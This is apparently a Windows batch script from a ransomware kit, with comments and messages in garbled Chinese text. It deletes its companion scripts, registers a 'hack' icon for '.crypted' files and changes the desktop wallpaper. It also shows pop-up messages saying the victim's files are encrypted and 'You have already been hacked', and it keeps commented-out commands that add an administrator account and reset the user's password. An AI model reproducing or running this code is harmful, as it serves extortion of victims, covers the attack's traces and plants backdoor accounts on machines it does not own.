::@echo off
@del /s /q/ f %~dp0\mail.bat
@del /s /q/ f %~dp0\robot.bat
::������hack���ļ�ͼ�겢ɾ��Դ�ļ�
copy %~dp0\520.ico %WINDIR%\520.ico
@del /s /q/ f %~dp0\520.ico
@assoc .crypted=hack
@ftype hack=
@reg add HKEY_CLASSES_ROOT\hack\DefaultIcon /ve /d "%WINDIR%\520.ico" /f
::���������ֽ
@if not exist %WINDIR%\Web\Wallpaper md %WINDIR%\Web\Wallpaper
@copy %~dp0\123.jpg %WINDIR%\Web\Wallpaper.jpg
@del /s /q /f %~dp0\123.jpg
@reg add "hkcu\control panel\desktop" /v "wallpaper" /d "%WINDIR%\Web\Wallpaper.jpg" /f
::ˢ��ϵͳ
@RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
::������־��ϵͳ�̸�Ŀ¼��ɾ��Դ�ļ��������־
copy %~dp0\log.txt %WINDIR%\log.txt
del /s /q/ f %~dp0\log.txt
::net user ��qq123456 123 /add
::net localgroup administrators ��qq123456 /add
::net user %username% 789
rem net user ��qq123456789 /delete
::������Դ������
@RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
@RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
::������ʾ
@mshta vbscript:msgbox("��ϲ������������֮������",6,"ϵͳ��ʾ")(window.close)
@mshta vbscript:msgbox("Dear Ooops: ���ĵ����Ѿ����ڣ������������ĵ��Ѿ������ܣ�ǿ�ҽ��������������ϵ���ʾ���в����������������޷���ص���ʧ����ʱ��ǧ��Ҫ�ر�������ڣ��������������ٴν���ϵͳ����������������",6,"������ʾ:You have already been hacked")(window.close)
::shutdown -l
exit>nul
